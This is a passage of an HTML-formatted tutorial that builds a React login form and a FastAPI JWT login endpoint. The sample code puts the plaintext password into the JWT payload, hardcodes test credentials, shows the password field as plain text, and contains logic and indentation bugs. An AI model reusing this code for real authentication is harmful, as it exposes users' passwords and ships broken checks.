&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;//check to see if the fields are not empty&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// make api call to our backend. we'll leave this for later&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
          &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;you&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;logged&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                  &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                  &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
                &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;label&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginRight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Input&lt;/span&gt; &lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/label&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;input&lt;/span&gt;
                  &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;text&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
                  &lt;span class="nx"&gt;onChange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;target&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
                &lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;              &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/form&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;          &lt;span class="p"&gt;)}&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll be pausing there for now. It's time to work on our backend.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#creating-the-backend"&gt;
  &lt;/a&gt;
  Creating the backend
&lt;/h3&gt;

&lt;p&gt;Now lets open up our backend folder, create a &lt;code&gt;main.py&lt;/code&gt; file and input the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pydantic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseModel&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;jwt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pydantic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseModel&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi.encoders&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;jsonable_encoder&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;fastapi.middleware.cors&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CORSMiddleware&lt;/span&gt;


&lt;span class="n"&gt;SECERT_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"YOUR_FAST_API_SECRET_KEY"&lt;/span&gt;
&lt;span class="n"&gt;ALGORITHM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"HS256"&lt;/span&gt;
&lt;span class="n"&gt;ACCESS_TOKEN_EXPIRES_MINUTES&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;

&lt;span class="n"&gt;test_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="s"&gt;"username"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"temitope"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"temipassword"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FastAPI&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;origins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s"&gt;"http://localhost"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s"&gt;"http://localhost:3000"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_middleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
   &lt;span class="n"&gt;CORSMiddleware&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_origins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;origins&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_credentials&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;allow_methods&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"*"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="n"&gt;allow_headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"*"&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LoginItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseModel&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;

    &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;read_root&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"Hello"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"World"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/login"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;user_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loginitem&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;LoginItem&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;


    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsonable_encoder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loginitem&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;test_user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;test_user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;

        &lt;span class="n"&gt;encoded_jwt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jwt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SECERT_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ALGORITHM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"token"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;encoded_jwt&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"message"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s"&gt;"login failed"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we are trying to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Generate a token.&lt;/li&gt;
&lt;li&gt;Defining a &lt;code&gt;test user object&lt;/code&gt; to check against the user login credentials&lt;/li&gt;
&lt;li&gt;Configuring our &lt;code&gt;CORS&lt;/code&gt; to allow our React app to send POST requests&lt;/li&gt;
&lt;li&gt;Running a check with the coming data with &lt;code&gt;test_user&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Almost done now that we're done, let's go back to the fronted and finish things up. head over to login.js and replace with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;axios&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;axios&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setUsername&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;setPassword&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useState&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="c1"&gt;//check to see if the fields are not empty&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// make api call to our backend. we'll leave thisfor later&lt;/span&gt;
      &lt;span class="nx"&gt;axios&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;http://localhost:8000/login&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="na"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="na"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;response.data.token&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
